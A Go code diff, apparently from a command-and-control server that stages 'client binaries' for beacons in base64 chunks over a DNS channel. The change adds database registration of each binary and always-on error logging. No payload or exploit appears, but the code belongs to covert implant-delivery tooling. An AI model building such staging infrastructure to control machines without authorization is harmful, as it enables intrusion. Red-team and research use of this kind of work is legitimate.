@@ -1266,6 +1266,12 @@ func (api *APIServer) loadAndProcessClientBinary(osType, arch string) (string, s
 
 	fmt.Printf("[Master] Will split into %d chunks of %d bytes each\n", totalChunks, chunkSize)
 
+	// Ensure this beacon exists in client_binaries table (needed for foreign key constraint)
+	err = api.db.UpsertClientBinary(beaconID, filepath.Base(clientPath), osType, arch, len(clientData), len(compressed), len(base64Data))
+	if err != nil {
+		return "", "", 0, fmt.Errorf("failed to register client binary in database: %w", err)
+	}
+
 	return beaconID, base64Data, totalChunks, nil
 } // handleStagerInit processes stager initialization (STG message forwarded from DNS server)
 func (api *APIServer) handleStagerInit(w http.ResponseWriter, r *http.Request) {
@@ -1288,12 +1294,13 @@ func (api *APIServer) handleStagerInit(w http.ResponseWriter, r *http.Request) {
 	// Load and process client binary from filesystem
 	clientBinaryID, base64Data, totalChunks, err := api.loadAndProcessClientBinary(req.OS, req.Arch)
 	if err != nil {
+		// Always log this error - critical for troubleshooting
+		fmt.Printf("[API] ❌ Failed to load client binary for %s/%s: %v\n", req.OS, req.Arch, err)
 		api.sendError(w, http.StatusNotFound, fmt.Sprintf("failed to load client binary: %v", err))
-		if api.config.Debug {
-			fmt.Printf("[API] Failed to load client binary: %v\n", err)
-		}
 		return
 	}
+
+	fmt.Printf("[API] ✅ Loaded client binary: %s (%d chunks)\n", clientBinaryID, totalChunks)
 
 	// Create stager session
 	sessionID := fmt.Sprintf("stg_%d_%d", time.Now().UnixNano(), rand.Intn(10000))
@@ -1309,10 +1316,9 @@ func (api *APIServer) handleStagerInit(w http.ResponseWriter, r *http.Request) {
 	)
 
 	if err != nil {
-		api.sendError(w, http.StatusInternalServerError, "failed to create stager session")
-		if api.config.Debug {
-			fmt.Printf("[API] Failed to create stager session: %v\n", err)
-		}
+		// Always log this error (not just in debug mode) - critical for troubleshooting
+		fmt.Printf("[API] ❌ Failed to create stager session: %v\n", err)
+		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to create stager session: %v", err))
 		return
 	}
 
